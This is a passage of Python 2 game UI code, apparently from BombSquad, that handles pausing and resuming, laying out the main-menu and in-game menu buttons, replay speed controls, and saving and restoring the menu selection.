            elif sel == self._powerRankingButton:
                selName = 'PowerRanking'
            elif sel == self._scrollWidget:
                selName = 'Scroll'
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = {'selName': selName}
        except Exception:
            bs.printException('error saving state for', self.__class__)

        cfg['Selected Coop Row'] = self._selectedRow
        cfg['Selected Coop Custom Level'] = self._selectedCustomLevel
        cfg['Selected Coop Challenge Level'] = self._selectedChallengeLevel
        cfg['Selected Coop Campaign Level'] = self._selectedCampaignLevel
        bs.writeConfig()

    def _selChange(self, row, game):
        if self._doSelectionCallbacks:
            if row == 'custom':
                self._selectedCustomLevel = game
            if row == 'challenges':
                self._selectedChallengeLevel = game
            elif row == 'campaign':
                self._selectedCampaignLevel = game


def pause():

    # if there's a foreground host-activity that says it's pausable, tell it
    # to pause ..we now no longer pause if there are connected clients.
    activity = bsInternal._getForegroundHostActivity()
    if (activity is not None and activity._allowPausing
            and not bsInternal._haveConnectedClients()):
        with bs.Context(activity):
            g = bs.getSharedObject('globals')
            if not g.paused:
                bs.playSound(bs.getSound('refWhistle'))
                g.paused = True
            activity._pausedText = bs.NodeActor(
                bs.newNode(
                    'text',
                    attrs={'text': bs.Lstr(resource='pausedByHostText'),
                           'clientOnly': True, 'flatness': 1.0,
                           'hAlign': 'center'}))


def resume():

    # if there's a foreground host-activity that's currently paused, tell it
    # to resume
    activity = bsInternal._getForegroundHostActivity()
    if activity is not None:
        with bs.Context(activity):
            g = bs.getSharedObject('globals')
            if g.paused:
                bs.playSound(bs.getSound('refWhistle'))
                g.paused = False
                activity._pausedText = None


gMainMenuResumeCallbacks = []


def addMainMenuCloseCallback(call):

    # if there's no main menu up, just call immediately
    if (uiGlobals['mainMenuWindow'] is None
            or not uiGlobals['mainMenuWindow'].exists()):
        with bs.Context('UI'):
            call()
    else:
        gMainMenuResumeCallbacks.append(call)


gMainMenuWindowRefreshCheckCount = 0

gFirstMainMenu = True


def _returnToMainMenuSessionGracefully():

    import bsMainMenu
    if isinstance(
            bsInternal._getForegroundHostSession(),
            bsMainMenu.MainMenuSession):
        # it may be possible we're on the main menu but the screen is faded..
        # so fade back in
        bsInternal._fadeScreen(True)
        return

    bsUtils.stopStressTest()  # stops any in-progress stress-testing

    # if we're in a host-session, tell them to end
    # this lets them tear themselves down gracefully..
    hostSession = bsInternal._getForegroundHostSession()
    if hostSession is not None:

        # kick off a little transaction so we'll hopefully have all the latest
        # account state when we get back to the menu
        bsInternal._addTransaction(
            {'type': 'END_SESSION', 'sType': str(type(hostSession))})
        bsInternal._runTransactions()

        hostSession.end()
    # otherwise just force the issue..
    else:
        import bsMainMenu
        bs.pushCall(bs.Call(bsInternal._newHostSession,
                            bsMainMenu.MainMenuSession))


class MainMenuWindow(Window):

    def __init__(self, transition='inRight'):

        import bsMainMenu
        global gFirstMainMenu

        self._inGame = not isinstance(
            bsInternal._getForegroundHostSession(),
            bsMainMenu.MainMenuSession)
        if not self._inGame:
            bsInternal._setAnalyticsScreen('Main Menu')

            # the first time the non-in-game menu pops up, we might wanna show
            # a 'get-remote-app' dialog in front of it
            if gFirstMainMenu:
                gFirstMainMenu = False
                try:
                    env = bs.getEnvironment()
                    forceTest = False
                    dCount = bsInternal._getLocalActiveInputDevicesCount()
                    if (((env['onTV'] or env['platform'] == 'mac')
                            and bs.getConfig().get('launchCount', 0) <= 1)
                            or forceTest):
                        def _checkShowBSRemoteWindow():
                            try:
                                import bsUI2
                                bs.playSound(bs.getSound('swish'))
                                bsUI2.GetBSRemoteWindow()
                            except Exception:
                                bs.printException(
                                    'error showing bs-remote window')
                        bs.realTimer(2500, _checkShowBSRemoteWindow)
                except Exception as e:
                    print 'EXC bsRemoteShow', e

        # make a vanilla container; we'll modify it to our needs in refresh
        self._rootWidget = bs.containerWidget(
            transition=transition, toolbarVisibility='MENU_MINIMAL_NOBACK'
            if self._inGame else 'MENU_MINIMAL_NOBACK')

        self._storeCharTex = self._getStoreCharTex()

        self._refresh()
        self._restore_state()

        # keep an eye on a few things and refresh if they change
        self._accountState = bsInternal._getAccountState()
        self._accountStateNum = bsInternal._getAccountStateNum()
        self._accountType = bsInternal._getAccountType(
        ) if self._accountState == 'SIGNED_IN' else None
        self._refreshTimer = bs.Timer(
            1000, bs.WeakCall(self._checkRefresh),
            repeat=True, timeType='real')

    def _getStoreCharTex(self):
        return ('storeCharacterXmas' if bsInternal._getAccountMiscReadVal(
            'xmas', False) else 'storeCharacterEaster'
                if bsInternal._getAccountMiscReadVal('easter', False)
                else 'storeCharacter')

    def _checkRefresh(self):

        if not self._rootWidget.exists():
            return

        # dont refresh for the first few seconds the game is up so we don't
        # interrupt the transition in
        global gMainMenuWindowRefreshCheckCount
        gMainMenuWindowRefreshCheckCount += 1
        if gMainMenuWindowRefreshCheckCount < 3:
            return

        storeCharTex = self._getStoreCharTex()

        accountStateNum = bsInternal._getAccountStateNum()
        if (accountStateNum != self._accountStateNum
                or storeCharTex != self._storeCharTex):
            self._storeCharTex = storeCharTex
            self._accountStateNum = accountStateNum
            accountState = self._accountState = bsInternal._getAccountState()
            self._accountType = bsInternal._getAccountType(
            ) if accountState == 'SIGNED_IN' else None
            self._save_state()
            self._refresh()
            self._restore_state()

    def getPlayButton(self):
        return self._startButton

    def _refresh(self):

        # clear everything that was there..
        children = self._rootWidget.getChildren()
        for c in children:
            c.delete()

        # alter some default behavior when going through the main menu..
        if not self._inGame:
            bsUtils.gRunningKioskModeGame = False

        #useAutoSelect = False if self._inGame else True
        useAutoSelect = True

        buttonHeight = 45
        buttonWidth = 200
        padding = 10

        tDelay = 0
        tDelayInc = 0
        tDelayPlay = 0

        is_kiosk = bs.getEnvironment()['kioskMode']

        self._r = 'mainMenu'

        env = bs.getEnvironment()
        self._haveQuitButton = (
            env['interfaceType'] == 'large' or bsInternal._isOuyaBuild(
            ) or (env['platform'] == 'windows'
                  and env['subplatform'] == 'oculus'))

        self._haveStoreButton = True if not self._inGame else False

        self._haveSettingsButton = True if ((not self._inGame or not env.get(
            'toolbarTest', True)) and not is_kiosk) else False

        self._inputDevice = inputDevice = bsInternal._getUIInputDevice()
        self._inputPlayer = (inputDevice.getPlayer()
                             if inputDevice is not None else None)
        if self._inputPlayer is not None and not self._inputPlayer.exists():
            self._inputPlayer = None
        self._connectedToRemotePlayer = inputDevice.isConnectedToRemotePlayer(
        ) if inputDevice is not None else False

        positions = []
        pIndex = 0

        if self._inGame:

            customMenuEntries = []
            session = bsInternal._getForegroundHostSession()
            if session is not None:
                try:
                    customMenuEntries = session.getCustomMenuEntries()
                    for c in customMenuEntries:
                        if (type(c) is not dict or not 'label' in c
                              or type(c['label']) not in (str, unicode, bs.Lstr)
                              or 'call' not in c or not callable(c['call'])):
                            raise Exception(
                                "invalid custom menu entry: "+str(c))
                except Exception:
                    customMenuEntries = []
                    bs.printException(
                        'exception getting custom menu entries for', session)

            self._width = 250
            self._height = 250 if self._inputPlayer is not None else 180
            if is_kiosk and self._inputPlayer is not None: self._height -= 40
            if not self._haveSettingsButton:
                self._height -= 50
            if self._connectedToRemotePlayer:
                # in this case we have a leave *and* a disconnect button
                self._height += 50
            self._height += 50*(len(customMenuEntries))
            bs.containerWidget(
                edit=self._rootWidget, size=(self._width, self._height),
                scale=2.15 if gSmallUI else 1.6 if gMedUI else 1.0)
            h = 125
            v = (self._height-80 if self._inputPlayer is not None
                 else self._height-60)
            hOffset = 0
            dhOffset = 0
            vOffset = -50
            for i in range(6+len(customMenuEntries)):
                positions.append((h, v, 1.0))
                v += vOffset
                h += hOffset
                hOffset += dhOffset

        # not in game
        else:
            global gDidMenuIntro
            if gDidMenuIntro == False:
                tDelay = 2000
                tDelayInc = 20
                tDelayPlay = 1700
                gDidMenuIntro = True

            self._width = 400
            self._height = 200

            accountType = bsInternal._getAccountType(
            ) if bsInternal._getAccountState() == 'SIGNED_IN' else None
            enableAccountButton = True

            if bsInternal._getAccountState() == 'SIGNED_IN':
                accountTypeName = bsInternal._getAccountDisplayString()
                accountTypeIcon = None
                accountTextColor = (1, 1, 1)
            else:
                accountTypeName = bs.Lstr(
                    resource='notSignedInText',
                    fallbackResource='accountSettingsWindow.titleText')
                accountTypeIcon = None
                accountTextColor = (1, 0.2, 0.2)
            accountTypeIconColor = (1, 1, 1)
            accountTypeCall = self._showAccountWindow
            accountTypeEnableButtonSound = True

            bCount = 4  # play, help, credits, settings
            if enableAccountButton:
                bCount += 1
            if self._haveQuitButton:
                bCount += 1
            if self._haveStoreButton:
                bCount += 1

            if gSmallUI:
                rootWidgetScale = 1.6
                playButtonWidth = buttonWidth*0.65
                playButtonHeight = buttonHeight*1.1
                smallButtonScale = 0.51 if bCount > 6 else 0.63
                buttonYOffs = -20
                buttonYOffs2 = -60
                buttonHeight *= 1.3
                buttonSpacing = 1.04
            elif gMedUI:
                rootWidgetScale = 1.3
                playButtonWidth = buttonWidth*0.65
                playButtonHeight = buttonHeight*1.1
                smallButtonScale = 0.6
                buttonYOffs = -55
                buttonYOffs2 = -75
                buttonHeight *= 1.25
                buttonSpacing = 1.1
            else:
                rootWidgetScale = 1.0
                playButtonWidth = buttonWidth*0.65
                playButtonHeight = buttonHeight*1.1
                smallButtonScale = 0.75
                buttonYOffs = -80
                buttonYOffs2 = -100
                buttonHeight *= 1.2
                buttonSpacing = 1.1

            spc = buttonWidth*smallButtonScale*buttonSpacing

            bs.containerWidget(
                edit=self._rootWidget, size=(self._width, self._height),
                background=False, scale=rootWidgetScale)

            positions = [[self._width*0.5, buttonYOffs, 1.7]]
            xOffs = self._width*0.5-(spc*(bCount-1)*0.5)+(spc*0.5)
            for i in range(bCount-1):
                positions.append(
                    [xOffs+spc*i-1.0, buttonYOffs+buttonYOffs2,
                     smallButtonScale])

        if not self._inGame:

            # in kiosk mode, provide a button to get back to the kiosk menu
            if bs.getEnvironment()['kioskMode']:
                h, v, scale = positions[pIndex]
                thisBWidth = buttonWidth*0.4*scale
                demoMenuDelay = 0 if tDelayPlay == 0 else max(0, tDelayPlay+100)
                self._demoMenuButton = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(self._width * 0.5 - thisBWidth * 0.5, v + 90),
                    size=(thisBWidth, 45),
                    autoSelect=True, color=(0.45, 0.55, 0.45),
                    textColor=(0.7, 0.8, 0.7),
                    label=bs.Lstr(resource=self._r + '.demoMenuText'),
                    transitionDelay=demoMenuDelay,
                    onActivateCall=self._demoMenuPress)
            else:
                self._demoMenuButton = None

            foo = -1 if gSmallUI else 1 if gMedUI else 3

            h, v, scale = positions[pIndex]
            v = v + foo
            gatherDelay = 0 if tDelayPlay == 0 else max(0, tDelayPlay+100)
            thisH = h-playButtonWidth*0.5*scale-40*scale
            thisBWidth = buttonWidth*0.25*scale
            thisBHeight = buttonHeight*0.82*scale
            self._gatherButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=(thisH - thisBWidth * 0.5, v),
                size=(thisBWidth, thisBHeight),
                autoSelect=useAutoSelect, buttonType='square', label='',
                transitionDelay=gatherDelay, onActivateCall=self._gatherPress)
            bs.textWidget(parent=self._rootWidget,
                          position=(thisH, v+buttonHeight*0.33),
                          size=(0, 0),
                          scale=0.75,
                          transitionDelay=gatherDelay,
                          drawController=b,
                          color=(0.75, 1.0, 0.7),
                          maxWidth=buttonWidth*0.33,
                          text=bs.Lstr(resource='gatherWindow.titleText'),
                          hAlign='center', vAlign='center')
            iconSize = thisBWidth*0.6
            bs.imageWidget(parent=self._rootWidget, size=(iconSize, iconSize),
                           drawController=b,
                           transitionDelay=gatherDelay,
                           position=(thisH-0.5*iconSize, v+0.31*thisBHeight),
                           texture=bs.getTexture('usersButton'))

            # play button
            h, v, scale = positions[pIndex]
            pIndex += 1
            self._startButton = startButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h - playButtonWidth * 0.5 * scale, v),
                size=(playButtonWidth, playButtonHeight),
                autoSelect=useAutoSelect, scale=scale, textResScale=2.0,
                label=bs.Lstr(resource='playText'),
                transitionDelay=tDelayPlay, onActivateCall=self._playPress)

            bs.containerWidget(
                edit=self._rootWidget, startButton=startButton,
                selectedChild=startButton)

            v = v + foo

            watchDelay = 0 if tDelayPlay == 0 else max(0, tDelayPlay-100)
            thisH = h+playButtonWidth*0.5*scale+40*scale
            thisBWidth = buttonWidth*0.25*scale
            thisBHeight = buttonHeight*0.82*scale
            self._watchButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=(thisH - thisBWidth * 0.5, v),
                size=(thisBWidth, thisBHeight),
                autoSelect=useAutoSelect, buttonType='square', label='',
                transitionDelay=watchDelay, onActivateCall=self._watchPress)

            bs.textWidget(parent=self._rootWidget,
                          position=(thisH, v+buttonHeight*0.33),
                          size=(0, 0),
                          scale=0.75,
                          transitionDelay=watchDelay,
                          color=(0.75, 1.0, 0.7),
                          drawController=b,
                          maxWidth=buttonWidth*0.33,
                          text=bs.Lstr(resource='watchWindow.titleText'),
                          hAlign='center', vAlign='center')
            iconSize = thisBWidth*0.55
            bs.imageWidget(parent=self._rootWidget, size=(iconSize, iconSize),
                           drawController=b,
                           transitionDelay=watchDelay,
                           position=(thisH-0.5*iconSize, v+0.33*thisBHeight),
                           texture=bs.getTexture('tv'))

            if not self._inGame and enableAccountButton:
                thisBWidth = buttonWidth
                h, v, scale = positions[pIndex]
                pIndex += 1
                self._gcButton = gcButton = b = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(h - thisBWidth * 0.5 * scale, v),
                    size=(thisBWidth, buttonHeight),
                    scale=scale, label=accountTypeName,
                    autoSelect=useAutoSelect, onActivateCall=accountTypeCall,
                    textColor=accountTextColor, icon=accountTypeIcon,
                    iconColor=accountTypeIconColor, transitionDelay=tDelay,
                    enableSound=accountTypeEnableButtonSound)

                # scattered eggs on easter
                if bsInternal._getAccountMiscReadVal(
                        'easter', False) and not self._inGame:
                    iconSize = 32
                    iw = bs.imageWidget(parent=self._rootWidget,
                                        position=(h - iconSize * 0.5 + 35, v +
                                                  buttonHeight * scale -
                                                  iconSize * 0.24 + 1.5),
                                        transitionDelay=tDelay,
                                        size=(iconSize, iconSize),
                                        texture=bs.getTexture('egg2'),
                                        tiltScale=0.0)
                tDelay += tDelayInc
            else:
                self._gcButton = None

            # how-to-play button
            h, v, scale = positions[pIndex]
            pIndex += 1
            self._howToPlayButton = howToPlayButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h - buttonWidth * 0.5 * scale, v),
                scale=scale, autoSelect=useAutoSelect,
                size=(buttonWidth, buttonHeight),
                label=bs.Lstr(resource=self._r + '.howToPlayText'),
                transitionDelay=tDelay, onActivateCall=self._howToPlay)

            # scattered eggs on easter
            if bsInternal._getAccountMiscReadVal(
                    'easter', False) and not self._inGame:
                iconSize = 28
                iw = bs.imageWidget(
                    parent=self._rootWidget,
                    position=(h - iconSize * 0.5 + 30,
                              v + buttonHeight * scale -
                              iconSize * 0.24 + 1.5),
                    transitionDelay=tDelay, size=(iconSize, iconSize),
                    texture=bs.getTexture('egg4'),
                    tiltScale=0.0)

            # credits button
            tDelay += tDelayInc
            h, v, scale = positions[pIndex]
            pIndex += 1
            self._creditsButton = creditsButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h - buttonWidth*0.5*scale, v),
                size=(buttonWidth, buttonHeight), autoSelect=useAutoSelect,
                label=bs.Lstr(
                    resource=self._r+'.creditsText'),
                scale=scale,
                transitionDelay=tDelay,
                onActivateCall=self._credits)
            tDelay += tDelayInc

        # in-game
        else:
            self._startButton = None
            pause()

            # (player name if applicable)
            if self._inputPlayer is not None:
                playerName = self._inputPlayer.getName()
                h, v, scale = positions[pIndex]
                v += 35
                b = bs.textWidget(
                    parent=self._rootWidget, position=(h - buttonWidth / 2, v),
                    size=(buttonWidth, buttonHeight),
                    color=(1, 1, 1, 0.5),
                    scale=0.7, hAlign='center', text=bs.Lstr(
                        value=playerName))
            else:
                playerName = ''

            h, v, scale = positions[pIndex]
            pIndex += 1

            b = bs.buttonWidget(
                parent=self._rootWidget, position=(h - buttonWidth / 2, v),
                size=(buttonWidth, buttonHeight),
                scale=scale, label=bs.Lstr(
                    resource=self._r + '.resumeText'),
                autoSelect=useAutoSelect, onActivateCall=self._resume)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)

            # add any custom options defined by the current game
            for entry in customMenuEntries:
                h, v, scale = positions[pIndex]
                pIndex += 1

                # ask the entry whether we should resume when we call
                # it (defaults to true)
                try:
                    resume = entry['resumeOnCall']
                except Exception:
                    resume = True

                if resume:
                    call = bs.Call(self._resumeAndCall, entry['call'])
                else:
                    call = bs.Call(entry['call'], bs.WeakCall(self._resume))

                b = bs.buttonWidget(parent=self._rootWidget,
                                    position=(h - buttonWidth / 2, v),
                                    size=(buttonWidth, buttonHeight),
                                    scale=scale, onActivateCall=call,
                                    label=entry['label'],
                                    autoSelect=useAutoSelect)

            # add a 'leave' button if the menu-owner has a player
            if ((self._inputPlayer is not None or self._connectedToRemotePlayer)
                    and not is_kiosk):
                h, v, scale = positions[pIndex]
                pIndex += 1
                b = bs.buttonWidget(parent=self._rootWidget,
                                    position=(h - buttonWidth / 2, v),
                                    size=(buttonWidth, buttonHeight),
                                    scale=scale, onActivateCall=self._leave,
                                    label='', autoSelect=useAutoSelect)

                if (playerName != '' and playerName[0] != '<'
                        and playerName[-1] != '>'):
                    t = bs.Lstr(resource=self._r+'.justPlayerText',
                                subs=[('${NAME}', playerName)])
                else:
                    t = bs.Lstr(value=playerName)
                    # t = playerName
                bs.textWidget(
                    parent=self._rootWidget,
                    position=(h, v + buttonHeight *
                              (0.64 if playerName != '' else 0.5)),
                    size=(0, 0),
                    text=bs.Lstr(resource=self._r + '.leaveGameText'),
                    scale=(0.83 if playerName != '' else 1.0),
                    color=(0.75, 1.0, 0.7),
                    hAlign='center', vAlign='center', drawController=b,
                    maxWidth=buttonWidth * 0.9)
                bs.textWidget(
                    parent=self._rootWidget,
                    position=(h, v + buttonHeight * 0.27),
                    size=(0, 0),
                    text=t, color=(0.75, 1.0, 0.7),
                    hAlign='center', vAlign='center', drawController=b,
                    scale=0.45, maxWidth=buttonWidth * 0.9)

        if self._haveSettingsButton:
            h, v, scale = positions[pIndex]
            pIndex += 1
            self._settingsButton = settingsButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h - buttonWidth * 0.5 * scale, v),
                size=(buttonWidth, buttonHeight),
                scale=scale, autoSelect=useAutoSelect, label=bs.Lstr(
                    resource=self._r + '.settingsText'),
                transitionDelay=tDelay, onActivateCall=self._settings)

        # scattered eggs on easter
        if bsInternal._getAccountMiscReadVal(
                'easter', False) and not self._inGame:
            iconSize = 34
            iw = bs.imageWidget(
                parent=self._rootWidget,
                position=(h - iconSize * 0.5 - 15, v + buttonHeight * scale -
                          iconSize * 0.24 + 1.5),
                transitionDelay=tDelay, size=(iconSize, iconSize),
                texture=bs.getTexture('egg3'),
                tiltScale=0.0)

        tDelay += tDelayInc

        if self._inGame:
            h, v, scale = positions[pIndex]
            pIndex += 1

            # if we're in a replay, we have a 'Leave Replay' button
            if bsInternal._isInReplay():
                b = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(h - buttonWidth * 0.5 * scale, v),
                    scale=scale, size=(buttonWidth, buttonHeight),
                    autoSelect=useAutoSelect, label=bs.Lstr(
                        resource='replayEndText'),
                    onActivateCall=self._confirmEndReplay)
            elif bsInternal._getForegroundHostSession() is not None:
                b = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(h - buttonWidth * 0.5 * scale, v),
                    scale=scale, size=(buttonWidth, buttonHeight),
                    autoSelect=useAutoSelect, label=bs.Lstr(
                        resource=self._r + '.endGameText'),
                    onActivateCall=self._confirmEndGame)
            # assume we're in a client-session..
            else:
                b = bs.buttonWidget(
                    parent=self._rootWidget,
                    position=(h - buttonWidth * 0.5 * scale, v),
                    scale=scale, size=(buttonWidth, buttonHeight),
                    autoSelect=useAutoSelect, label=bs.Lstr(
                        resource=self._r + '.leavePartyText'),
                    onActivateCall=self._confirmLeaveParty)

        if self._haveStoreButton:
            thisBWidth = buttonWidth
            h, v, scale = positions[pIndex]
            pIndex += 1

            sb = self._storeButtonInstance = StoreButton(
                parent=self._rootWidget,
                position=(h - thisBWidth * 0.5 * scale, v),
                size=(thisBWidth, buttonHeight),
                scale=scale, onActivateCall=bs.WeakCall(self._onStorePressed),
                saleScale=1.3, transitionDelay=tDelay)
            self._storeButton = storeButton = sb.getButtonWidget()
            iconSize = 55 if gSmallUI else 55 if gMedUI else 70
            iw = bs.imageWidget(
                parent=self._rootWidget,
                position=(h - iconSize * 0.5,
                          v + buttonHeight * scale - iconSize * 0.23),
                transitionDelay=tDelay, size=(iconSize, iconSize),
                texture=bs.getTexture(self._storeCharTex),
                tiltScale=0.0, drawController=storeButton)

            tDelay += tDelayInc
        else:
            self._storeButton = None

        if not self._inGame and self._haveQuitButton:
            h, v, scale = positions[pIndex]
            pIndex += 1
            self._quitButton = quitButton = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=useAutoSelect,
                position=(h - buttonWidth * 0.5 * scale, v),
                size=(buttonWidth, buttonHeight),
                scale=scale, label=bs.Lstr(
                    resource=self._r +
                    ('.quitText'
                     if 'Mac' in bs.getEnvironment()['userAgentString'] else
                     '.exitGameText')),
                onActivateCall=self._quit, transitionDelay=tDelay)

            # scattered eggs on easter
            if bsInternal._getAccountMiscReadVal('easter', False):
                iconSize = 30
                iw = bs.imageWidget(
                    parent=self._rootWidget,
                    position=(h - iconSize * 0.5 + 25,
                              v + buttonHeight * scale - iconSize * 0.24 + 1.5),
                    transitionDelay=tDelay, size=(iconSize, iconSize),
                    texture=bs.getTexture('egg1'),
                    tiltScale=0.0)

            # if bsInternal._isOuyaBuild() or _bs._isRunningOnFireTV():
            bs.containerWidget(edit=self._rootWidget, cancelButton=quitButton)
            tDelay += tDelayInc
        else:
            self._quitButton = None

            # if we're not in-game, have no quit button, and this is android,
            # we want back presses to quit our activity
            if (not self._inGame and not self._haveQuitButton
                    and 'android' in bs.getEnvironment()['userAgentString']):
                bs.containerWidget(edit=self._rootWidget, onCancelCall=bs.Call(
                    QuitWindow, swish=True, back=True))

        # add speed-up/slow-down buttons for replays
        # (ideally this should be part of a fading-out playback bar like most
        # media players but this works for now)
        if bsInternal._isInReplay():
            bSize = 50
            bBuffer = 10
            tScale = 0.75
            if gSmallUI:
                bSize *= 0.6
                bBuffer *= 1.0
                vOffs = -40
                tScale = 0.5
            elif gMedUI:
                vOffs = -70
            else:
                vOffs = -100
            self._replaySpeedText = bs.textWidget(
                parent=self._rootWidget, text=bs.Lstr(
                    resource='watchWindow.playbackSpeedText',
                    subs=[('${SPEED}', str(1.23))]),
                position=(h, v + vOffs + 7 * tScale),
                hAlign='center', vAlign='center', size=(0, 0),
                scale=tScale)
            # update to current value
            self._changeReplaySpeed(0)
            # keep updating in a timer in case it gets changed elsewhere
            self._changeReplaySpeedTimer = bs.Timer(
                250, bs.WeakCall(self._changeReplaySpeed, 0),
                timeType='real', repeat=True)
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h - bSize - bBuffer, v - bSize - bBuffer + vOffs),
                buttonType='square', size=(bSize, bSize),
                label='', autoSelect=True, onActivateCall=bs.Call(
                    self._changeReplaySpeed, -1))
            bs.textWidget(
                parent=self._rootWidget, drawController=b, text='-',
                position=(h - bSize * 0.5 - bBuffer,
                          v - bSize * 0.5 - bBuffer + 5 * tScale + vOffs),
                hAlign='center', vAlign='center', size=(0, 0),
                scale=3.0 * tScale)
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(h + bBuffer, v - bSize - bBuffer + vOffs),
                buttonType='square', size=(bSize, bSize),
                label='', autoSelect=True, onActivateCall=bs.Call(
                    self._changeReplaySpeed, 1))
            bs.textWidget(
                parent=self._rootWidget, drawController=b, text='+',
                position=(h + bSize * 0.5 + bBuffer,
                          v - bSize * 0.5 - bBuffer + 5 * tScale + vOffs),
                hAlign='center', vAlign='center', size=(0, 0),
                scale=3.0 * tScale)

    def _changeReplaySpeed(self, offs):
        bsInternal._setReplaySpeedExponent(
            bsInternal._getReplaySpeedExponent()+offs)
        actualSpeed = pow(2.0, bsInternal._getReplaySpeedExponent())
        bs.textWidget(edit=self._replaySpeedText,
                      text=bs.Lstr(resource='watchWindow.playbackSpeedText',
                                   subs=[('${SPEED}', str(actualSpeed))]))

    def _quit(self):
        QuitWindow(originWidget=self._quitButton)

    def _demoMenuPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = KioskWindow(
            transition='inLeft').getRootWidget()

    def _showAccountWindow(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = AccountWindow(
            originWidget=self._gcButton).getRootWidget()

    def _onStorePressed(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = StoreWindow(
            originWidget=self._storeButton).getRootWidget()

    def _confirmEndGame(self):
        # FIXME - currently we crash calling this on client-sessions

        # select cancel by default; this occasionally gets called by accident
        # in a fit of button mashing
        # and this will help reduce damage
        ConfirmWindow(bs.Lstr(resource=self._r+'.exitToMenuText'),
                      self._endGame, cancelIsSelected=True)

    def _confirmEndReplay(self):
        # select cancel by default; this occasionally gets called by accident
        # in a fit of button mashing
        # and this will help reduce damage
        ConfirmWindow(bs.Lstr(resource=self._r+'.exitToMenuText'),
                      self._endGame, cancelIsSelected=True)

    def _confirmLeaveParty(self):

        # select cancel by default; this occasionally gets called by accident
        # in a fit of button mashing
        # and this will help reduce damage
        ConfirmWindow(
            bs.Lstr(resource=self._r + '.leavePartyConfirmText'),
            self._leaveParty, cancelIsSelected=True)

    def _leaveParty(self):
        bsInternal._disconnectFromHost()

    def _endGame(self):
        if not self._rootWidget.exists():
            return
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        _returnToMainMenuSessionGracefully()

    def _leave(self):
        if self._inputPlayer is not None and self._inputPlayer.exists():
            self._inputPlayer.removeFromGame()
        elif self._connectedToRemotePlayer:
            if self._inputDevice.exists():
                self._inputDevice.removeRemotePlayerFromGame()
        self._resume()

    def _credits(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = CreditsWindow(
            originWidget=self._creditsButton).getRootWidget()

    def _howToPlay(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = HelpWindow(
            mainMenu=True, originWidget=self._howToPlayButton).getRootWidget()

    def _settings(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = SettingsWindow(
            originWidget=self._settingsButton).getRootWidget()

    def _resumeAndCall(self, c):
        self._resume()
        c()

    def _doGameServicePress(self):
        self._save_state()
        bsInternal._showOnlineScoreUI()

    def _save_state(self):
        # dont do this for the in-game menu..
        if self._inGame:
            return
        global _gMainMenuSelection
        s = self._rootWidget.getSelectedChild()
        if s == self._startButton:
            _gMainMenuSelection = 'Start'
        elif s == self._gatherButton:
            _gMainMenuSelection = 'Gather'
        elif s == self._watchButton:
            _gMainMenuSelection = 'Watch'
        elif s == self._howToPlayButton:
            _gMainMenuSelection = 'HowToPlay'
        elif s == self._creditsButton:
            _gMainMenuSelection = 'Credits'
        elif s == self._settingsButton:
            _gMainMenuSelection = 'Settings'
        elif s == self._gcButton:
            _gMainMenuSelection = 'GameService'
        elif s == self._storeButton:
            _gMainMenuSelection = 'Store'
        elif s == self._quitButton:
            _gMainMenuSelection = 'Quit'
        elif s == self._demoMenuButton:
            _gMainMenuSelection = 'DemoMenu'
        else:
            print 'unknown widget in main menu store selection:'
            _gMainMenuSelection = 'Start'

    def _restore_state(self):
        # dont do this for the in-game menu..
        if self._inGame:
            return
        global _gMainMenuSelection
        try:
            selName = _gMainMenuSelection
        except Exception:
            selName = 'Start'
        if selName == 'HowToPlay':
            sel = self._howToPlayButton
        elif selName == 'Gather':
            sel = self._gatherButton
        elif selName == 'Watch':
            sel = self._watchButton
        elif selName == 'Credits':
            sel = self._creditsButton
        elif selName == 'Settings':
            sel = self._settingsButton
        elif selName == 'GameService':
            sel = self._gcButton
        elif selName == 'Store':
            sel = self._storeButton
        elif selName == 'Quit':
            sel = self._quitButton
        elif selName == 'DemoMenu':
            sel = self._demoMenuButton
        else:
            sel = self._startButton
        if sel is not None:
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)

    def _gatherPress(self):

        # we disallow net-play stuff if package mods are enabled
        # (that would cause lots of problems with clients having
        # different assets from eachother)
        if bsUtils.gAllowingPackageMods:
            bs.screenMessage(bs.Lstr(resource='packageModsEnabledErrorText'))
            bs.playSound(bs.getSound('error'))
            return

        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = GatherWindow(
            originWidget=self._gatherButton).getRootWidget()

    def _watchPress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = WatchWindow(
            originWidget=self._watchButton).getRootWidget()

    def _playPress(self):
        self._save_state()
        global gShouldAskToMakeProfile
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = PlayWindow(
            originWidget=self._startButton).getRootWidget()

    def _resume(self):
        resume()
        if self._rootWidget.exists():
            bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = None
        # if there's callbacks waiting for this window to go away, call them
